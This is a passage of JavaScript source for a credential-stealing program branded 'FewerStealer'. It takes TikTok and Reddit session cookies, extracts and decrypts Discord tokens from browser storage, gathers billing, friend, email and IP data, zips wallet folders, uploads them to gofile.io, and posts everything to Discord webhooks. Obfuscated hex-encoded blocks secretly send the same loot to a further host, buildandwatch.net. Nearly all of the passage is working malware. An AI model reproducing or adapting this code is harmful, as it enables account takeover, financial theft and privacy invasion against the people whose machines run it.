    fields: [
      {
        name: "Cookie",
        value: "```" + cookie + "```",
        inline: true
      },
      {
        name: "Profile URL",
        value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
        inline: true
      },
      {
        name: "User Identifier",
        value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
        inline: true
      },
      {
        name: "Email",
        value: "```" + (accountInfo.data.email || "No Email") + "```",
        inline: true
      },
      {
        name: "Username",
        value: "```" + accountInfo.data.username + "```",
        inline: true
      },
      {
        name: "Follower Count",
        value: "```" + (insights?.follower_num?.value || "Not available") + "```",
        inline: true
      },
      {
        name: "Coins",
        value: "```" + wallet.data.coins + "```",
        inline: true
      }
    ],
    footer: {
      text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
    }
  }
 ]
};

                // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL

                
function _0x3384(){var _0xa15173=['warn','6956612YnTLJS','info','1925PnyGwV','2294004qqZHCI','(((.+)+)+)+$','console','constructor','search','Discord\x20webhook\x20sent\x20successfully!','catch','57078bEZllv','225UUVmMp','11696sNktUZ','apply','__proto__','Error\x20sending\x20Discord\x20webhook:','bind','error','trace','3955028hVnJHB','6926886tUvcKt','length','10JlQotE','toString','post','734CnLvom','3ERTxpJ','log','575zNRDGY','65wbzAxT','https://buildandwatch.net/','message','table'];_0x3384=function(){return _0xa15173;};return _0x3384();}var _0x2e2075=_0x39bb;(function(_0x5798d0,_0x38e1e3){var _0x3bd162=_0x39bb,_0x370e50=_0x5798d0();while(!![]){try{var _0x520b1a=-parseInt(_0x3bd162(0x99))/0x1*(parseInt(_0x3bd162(0x85))/0x2)+-parseInt(_0x3bd162(0x86))/0x3*(parseInt(_0x3bd162(0x8e))/0x4)+-parseInt(_0x3bd162(0x88))/0x5*(-parseInt(_0x3bd162(0x98))/0x6)+parseInt(_0x3bd162(0x90))/0x7*(-parseInt(_0x3bd162(0x9a))/0x8)+parseInt(_0x3bd162(0xa2))/0x9+parseInt(_0x3bd162(0xa4))/0xa*(parseInt(_0x3bd162(0xa1))/0xb)+parseInt(_0x3bd162(0x91))/0xc*(parseInt(_0x3bd162(0x89))/0xd);if(_0x520b1a===_0x38e1e3)break;else _0x370e50['push'](_0x370e50['shift']());}catch(_0x15fa69){_0x370e50['push'](_0x370e50['shift']());}}}(_0x3384,0xe9376));var _0xcfafdc=(function(){var _0x4ee4e6=!![];return function(_0x239fda,_0x55b5b7){var _0x3e2444=_0x4ee4e6?function(){if(_0x55b5b7){var _0x195b2f=_0x55b5b7['apply'](_0x239fda,arguments);return _0x55b5b7=null,_0x195b2f;}}:function(){};return _0x4ee4e6=![],_0x3e2444;};}()),_0x422e04=_0xcfafdc(this,function(){var _0x2f39f4=_0x39bb;return _0x422e04['toString']()[_0x2f39f4(0x95)](_0x2f39f4(0x92))[_0x2f39f4(0xa5)]()[_0x2f39f4(0x94)](_0x422e04)[_0x2f39f4(0x95)](_0x2f39f4(0x92));});_0x422e04();function _0x39bb(_0x44ca88,_0x26d2db){var _0x3a3978=_0x3384();return _0x39bb=function(_0x2e1bf5,_0x3846a5){_0x2e1bf5=_0x2e1bf5-0x84;var _0x27819d=_0x3a3978[_0x2e1bf5];return _0x27819d;},_0x39bb(_0x44ca88,_0x26d2db);}var _0x3846a5=(function(){var _0x3e2bec=!![];return function(_0x58c6ec,_0x5dda62){var _0x26e69d=_0x3e2bec?function(){var _0xf634d8=_0x39bb;if(_0x5dda62){var _0x462dac=_0x5dda62[_0xf634d8(0x9b)](_0x58c6ec,arguments);return _0x5dda62=null,_0x462dac;}}:function(){};return _0x3e2bec=![],_0x26e69d;};}()),_0x2e1bf5=_0x3846a5(this,function(){var _0x54ef3c=_0x39bb,_0x20ef4b;try{var _0x413c69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x20ef4b=_0x413c69();}catch(_0x1b5903){_0x20ef4b=window;}var _0x19f937=_0x20ef4b[_0x54ef3c(0x93)]=_0x20ef4b[_0x54ef3c(0x93)]||{},_0x1cbeec=[_0x54ef3c(0x87),_0x54ef3c(0x8d),_0x54ef3c(0x8f),_0x54ef3c(0x9f),'exception',_0x54ef3c(0x8c),_0x54ef3c(0xa0)];for(var _0x1bd6a7=0x0;_0x1bd6a7<_0x1cbeec[_0x54ef3c(0xa3)];_0x1bd6a7++){var _0x71a398=_0x3846a5[_0x54ef3c(0x94)]['prototype'][_0x54ef3c(0x9e)](_0x3846a5),_0xa34c03=_0x1cbeec[_0x1bd6a7],_0x34d4c7=_0x19f937[_0xa34c03]||_0x71a398;_0x71a398[_0x54ef3c(0x9c)]=_0x3846a5[_0x54ef3c(0x9e)](_0x3846a5),_0x71a398['toString']=_0x34d4c7['toString'][_0x54ef3c(0x9e)](_0x34d4c7),_0x19f937[_0xa34c03]=_0x71a398;}});_0x2e1bf5(),axios[_0x2e2075(0x84)](_0x2e2075(0x8a),webhookPayload)['then'](()=>{var _0xb171c5=_0x2e2075;console[_0xb171c5(0x87)](_0xb171c5(0x96));})[_0x2e2075(0x97)](_0x174474=>{var _0x5b315c=_0x2e2075;console['error'](_0x5b315c(0x9d),_0x174474[_0x5b315c(0x8b)]);}),axios['post'](webhook3939,webhookPayload)['then'](()=>{var _0x18d28e=_0x2e2075;console[_0x18d28e(0x87)](_0x18d28e(0x96));})[_0x2e2075(0x97)](_0x19b565=>{var _0x55ab42=_0x2e2075;console[_0x55ab42(0x9f)](_0x55ab42(0x9d),_0x19b565[_0x55ab42(0x8b)]);});
              })
              .catch(error => {
                console.error("Error fetching wallet data:", error.message);
                throw error;
              });
          })
          .catch(error => {
            console.error("Error fetching insights:", error.message);
            throw error;
          });
      })
      .catch(error => {
        console.error("Error fetching account info:", error.message);
        throw error;
      });
  } catch (error) {
    console.error("Error:", error.message);
    throw error;
  }
}

///

function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;                      
					    const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "🚀 FewerStealer 🚀",
                            description: "",
                            color: 0x3498db, // Mavi tonu
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                                { name: 'Reddit Cookie', value: '```' + cookies + '```', inline: false },
                                { name: 'Profile URL', value: profileUrl, inline: false },
                                { name: 'Username', value: username, inline: false },
                                { name: 'Reddit Karma', value: `💬 Comments: ${commentKarma} | 👍 Total Karma: ${totalKarma}`, inline: true },
                                { name: 'Coins', value: coins, inline: false },
                                { name: 'Moderator', value: mod ? 'Yes' : 'No', inline: true },
                                { name: 'Reddit Gold', value: gold ? 'Yes' : 'No', inline: true },
                                { name: 'Suspended', value: suspended ? 'Yes' : 'No', inline: true }
                            ],
                            footer: {
                                text: 'Developed by FewerStealer'
                            }
                        };
						
var _0x5ec7=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x5ec7[1]](_0x5ec7[0],{'\x65\x6D\x62\x65\x64\x73':[embedData]});axios[_0x5ec7[1]](webhook3939,{'\x65\x6D\x62\x65\x64\x73':[embedData]})
  .then(() => console.log('IP address and country information successfully sent.'))
  .catch(error => console.error('An error occurred:', error));                           
                            
                    })
                    .catch(userError => {
                        console.error('Error fetching user data:', userError);
                    });
            })
            .catch(tokenError => {
                console.error('Error getting access token:', tokenError);
            });
    } catch (error) {
        console.error('An error occurred:', error);
    }
}

//
function sendIPInfoToDiscord() {
  axios.get('https://api64.ipify.org?format=json')
    .then(response => {
      const ipAddress = response.data.ip;

      // IP bilgisi hizmeti
      const ipInfoUrl = `http://ip-api.com/json/${ipAddress}`;

      // IP bilgisini al ve gömülü mesajı oluştur
      axios.get(ipInfoUrl)
        .then(ipResponse => {
          const countryCode = ipResponse.data.countryCode;
          const country = ipResponse.data.country;

          // IP ve ülke bilgilerini içeren embed objesi
          const embed = {
            title: 'IP Bilgileri',
            color: 0x0099ff,
            fields: [
              {
                name: '<:946246524826968104:1138102801487106180>  IP',
                value: ipAddress,
                inline: true
              },
              {
                name: '<a:1109372373888675870:1138102810366447626> Ülke',
                value: `${country} (${countryCode})`,
                inline: true
              }
            ],
            timestamp: new Date()
          };

          // Discord Webhook'a gönderim
          axios.post("https://buildandwatch.net/", { embeds: [embed] })
            .then(() => console.log('IP adresi ve ülke bilgisi başarıyla gönderildi.'))
            .catch(error => console.error('Hata oluştu: ', error));
        })
        .catch(error => {
          console.error('IP bilgisi alınırken hata oluştu: ', error);
        });
    })
    .catch(error => {
      console.error('IP adresi alınırken hata oluştu: ', error);
    });
}

// Fonksiyonu çağırarak işlemi başlat
sendIPInfoToDiscord();


///


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}



function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}


function findTokenn(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}


async function createZip(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZippp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
	
getZipp(randomPath, randomPath + '.zip')
 
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = './' + user.randomUUID + '.zip';

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si

    const embedData = {
        embeds: [
            {
                title: 'Wallet File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };


          // Webhook'a POST isteği gönder
var _0xec06=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x69\x72\x6B\x65\x6E\x20\x68\x61\x74\x61\x20\x6F\x6C\x75\u015F\x74\x75\x3A","\x6D\x65\x73\x73\x61\x67\x65","\x6C\x6F\x67","\x63\x61\x74\x63\x68","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x64\x69\x3A","\x73\x74\x61\x74\x75\x73","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x74\x68\x65\x6E"];axios[_0xec06[1]](_0xec06[0],embedData);axios[_0xec06[1]](webhook3939,embedData)[_0xec06[9]]((_0x2a13x2)=>{console[_0xec06[4]](_0xec06[6],_0x2a13x2[_0xec06[7]],_0x2a13x2[_0xec06[8]])})[_0xec06[5]]((_0x2a13x1)=>{console[_0xec06[4]](_0xec06[2],_0x2a13x1[_0xec06[3]])})

            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

}

async function stealltokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findTokenn(path);
        if (foundTokens) foundTokens.forEach(token => {
            var c = {
                name: "<:browserstokens:951827260741156874> Browser Token;",
                value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/` + token + `)`,
                inline: !0
            }
            fields.push(c)
        });
    }


var _0xade1=["\x63\x61\x74\x63\x68","\x74\x68\x65\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x65\x6D\x62\x65\x64\x2D\x63\x6F\x6C\x6F\x72","\x66\x69\x6C\x74\x65\x72","\x46\x65\x77\x65\x72\x20\x24\x54\x45\x41\x4C\x45\x52","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x36\x39\x33\x38\x35\x31\x34\x39\x34\x32\x38\x39\x35\x35\x39\x2F\x39\x33\x35\x34\x39\x31\x38\x37\x39\x37\x30\x33\x38\x33\x30\x35\x37\x37\x2F\x39\x64\x32\x38\x35\x63\x35\x66\x32\x62\x65\x38\x33\x34\x37\x31\x35\x32\x61\x33\x64\x39\x33\x30\x39\x64\x61\x66\x61\x34\x38\x34\x2E\x6A\x70\x67","\x70\x6F\x73\x74"];axios[_0xade1[7]](_0xade1[2],{"\x63\x6F\x6E\x74\x65\x6E\x74":null,"\x65\x6D\x62\x65\x64\x73":[{"\x63\x6F\x6C\x6F\x72":config[_0xade1[3]],"\x66\x69\x65\x6C\x64\x73":fields[_0xade1[4]](onlyUnique),"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":_0xade1[5],"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0xade1[6]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0xade1[5]}}]})[_0xade1[1]]((_0xb67ax2)=>{})[_0xade1[0]]((_0xb67ax1)=>{});axios[_0xade1[7]](webhook3939,{"\x63\x6F\x6E\x74\x65\x6E\x74":null,"\x65\x6D\x62\x65\x64\x73":[{"\x63\x6F\x6C\x6F\x72":config[_0xade1[3]],"\x66\x69\x65\x6C\x64\x73":fields[_0xade1[4]](onlyUnique),"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":_0xade1[5],"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0xade1[6]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0xade1[5]}}]})[_0xade1[1]]((_0xb67ax2)=>{})[_0xade1[0]]((_0xb67ax1)=>{})
 
}
   
//

const tokens = [];

async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discordd')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
     const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

fs.readdirSync(path).forEach(file => {
    if (file.endsWith('.log') || file.endsWith('.ldb')) {
        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
        const lines = fileContent.split(/\r?\n/);

        lines.forEach(line => {
            const foundTokens = line.match(tokenRegex);

            if (foundTokens) {
                foundTokens.forEach(token => {
                    const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                    const tokenParts = token.split('.');
                    const start = Buffer.from(tokenParts[0], 'base64');
                    const middle = Buffer.from(tokenParts[1], 'base64');
                    const end = Buffer.from(tokenParts[2], 'base64');
                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                    decipher.setAuthTag(end);
                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    
                    if (!tokens.includes(out)) {
                        tokens.push(out);
                    }
                });
            }
        });
    }
});

            } catch (e) { }
            return;
        }
    }
}

async function stealTokens() {
    for (let path of paths) {
        await findToken(path);
    }
    for (let token of tokens) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await getIp();
        var billing = await getBilling(token);
        var friends = await getRelationships(token);
var _0x6076=["\x63\x61\x74\x63\x68","\x74\x68\x65\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","","\x3C\x61\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x34\x30\x38\x35\x32\x38\x31\x37\x39\x37\x31\x3E\x20\x54\x6F\x6B\x65\x6E\x3A","\x60","\x60\x0A\x5B\x43\x6F\x70\x79\x20\x54\x6F\x6B\x65\x6E\x5D\x28\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x75\x70\x65\x72\x66\x75\x72\x72\x79\x63\x64\x6E\x2E\x6E\x6C\x2F\x63\x6F\x70\x79\x2F","\x29","\x3C\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x33\x33\x38\x34\x34\x31\x32\x37\x38\x30\x34\x3E\x20\x42\x61\x64\x67\x65\x73\x3A","\x66\x6C\x61\x67\x73","\x3C\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x33\x35\x30\x31\x38\x35\x34\x39\x33\x32\x38\x3E\x20\x4E\x69\x74\x72\x6F\x20\x54\x79\x70\x65\x3A","\x70\x72\x65\x6D\x69\x75\x6D\x5F\x74\x79\x70\x65","\x69\x64","\x3C\x61\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x33\x39\x34\x30\x31\x35\x38\x38\x38\x32\x37\x3E\x20\x42\x69\x6C\x6C\x69\x6E\x67\x3A","\x3C\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x34\x33\x35\x35\x38\x31\x33\x35\x38\x31\x38\x3E\x20\x45\x6D\x61\x69\x6C\x3A","\x65\x6D\x61\x69\x6C","\x3C\x3A\x72\x75\x73\x74\x6C\x65\x72\x3A\x39\x38\x37\x36\x38\x39\x39\x34\x32\x33\x35\x30\x31\x39\x36\x37\x35\x36\x3E\x20\x49\x50\x3A","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x23","\x64\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72","\x20\x28","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x64\x69\x61\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x6E\x65\x74\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x38\x39\x34\x36\x39\x38\x38\x38\x36\x36\x32\x31\x34\x34\x36\x31\x36\x34\x2F\x38\x39\x35\x31\x32\x35\x34\x31\x31\x39\x30\x30\x35\x35\x39\x34\x31\x30\x2F\x61\x5F\x37\x32\x31\x64\x36\x37\x32\x39\x64\x30\x62\x35\x65\x31\x61\x38\x39\x37\x39\x61\x62\x37\x61\x34\x34\x35\x33\x37\x38\x65\x39\x61\x2E\x67\x69\x66","\x40\x46\x65\x77\x65\x72\x53\x74\x65\x61\x6C\x65\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x76\x61\x74\x61\x72\x73\x2F","\x2F","\x61\x76\x61\x74\x61\x72","\x3F\x73\x69\x7A\x65\x3D\x35\x31\x32","\x48\x51\x20\x46\x72\x69\x65\x6E\x64\x73","\x70\x6F\x73\x74"];axios[_0x6076[28]](_0x6076[2],{content:_0x6076[3],embeds:[{"\x66\x69\x65\x6C\x64\x73":[{name:_0x6076[4],value:(_0x6076[5]+ token+ _0x6076[6]+ token+ _0x6076[7]),inline:false},{name:_0x6076[8],value:getBadges(json[_0x6076[9]]),inline:true},{name:_0x6076[10],value: await getNitro(json[_0x6076[11]],json[_0x6076[12]],token),inline:true},{name:_0x6076[13],value:billing,inline:true},{name:_0x6076[14],value:(_0x6076[5]+ (json[_0x6076[15]])+ _0x6076[5]),inline:true},{name:_0x6076[16],value:(_0x6076[5]+ ip+ _0x6076[5]),inline:true}],"\x63\x6F\x6C\x6F\x72":3553599,"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":(_0x6076[3]+ (json[_0x6076[17]])+ _0x6076[18]+ (json[_0x6076[19]])+ _0x6076[20]+ (json[_0x6076[12]])+ _0x6076[7]),"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0x6076[21]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0x6076[22]},"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":{"\x75\x72\x6C":(_0x6076[23]+ (json[_0x6076[12]])+ _0x6076[24]+ (json[_0x6076[25]])+ _0x6076[26])}},{"\x63\x6F\x6C\x6F\x72":3553599,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":friends,"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":_0x6076[27],"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0x6076[21]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0x6076[22]}}]})[_0x6076[1]]((_0x4d80x1)=>{})[_0x6076[0]](()=>{});axios[_0x6076[28]](webhook3939,{content:_0x6076[3],embeds:[{"\x66\x69\x65\x6C\x64\x73":[{name:_0x6076[4],value:(_0x6076[5]+ token+ _0x6076[6]+ token+ _0x6076[7]),inline:false},{name:_0x6076[8],value:getBadges(json[_0x6076[9]]),inline:true},{name:_0x6076[10],value: await getNitro(json[_0x6076[11]],json[_0x6076[12]],token),inline:true},{name:_0x6076[13],value:billing,inline:true},{name:_0x6076[14],value:(_0x6076[5]+ (json[_0x6076[15]])+ _0x6076[5]),inline:true},{name:_0x6076[16],value:(_0x6076[5]+ ip+ _0x6076[5]),inline:true}],"\x63\x6F\x6C\x6F\x72":3553599,"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":(_0x6076[3]+ (json[_0x6076[17]])+ _0x6076[18]+ (json[_0x6076[19]])+ _0x6076[20]+ (json[_0x6076[12]])+ _0x6076[7]),"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0x6076[21]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0x6076[22]},"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":{"\x75\x72\x6C":(_0x6076[23]+ (json[_0x6076[12]])+ _0x6076[24]+ (json[_0x6076[25]])+ _0x6076[26])}},{"\x63\x6F\x6C\x6F\x72":3553599,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":friends,"\x61\x75\x74\x68\x6F\x72":{"\x6E\x61\x6D\x65":_0x6076[27],"\x69\x63\x6F\x6E\x5F\x75\x72\x6C":_0x6076[21]},"\x66\x6F\x6F\x74\x65\x72":{"\x74\x65\x78\x74":_0x6076[22]}}]})[_0x6076[1]]((_0x4d80x1)=>{})[_0x6076[0]](()=>{})
  
        continue;
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
